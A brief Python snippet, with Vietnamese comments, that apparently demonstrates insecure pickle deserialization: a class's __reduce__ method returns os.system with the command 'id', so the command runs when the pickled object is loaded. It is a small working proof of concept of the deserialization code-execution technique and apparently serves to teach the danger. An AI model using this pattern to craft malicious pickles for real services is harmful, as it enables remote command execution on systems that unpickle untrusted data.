import pickle
class P(object):
    def __reduce__(self):
        return (__import__('os').system, ('id',))
# Serialize (bình thường không thực thi)
s = pickle.dumps(P())
# Deserialize mới thực thi
pickle.loads(s)
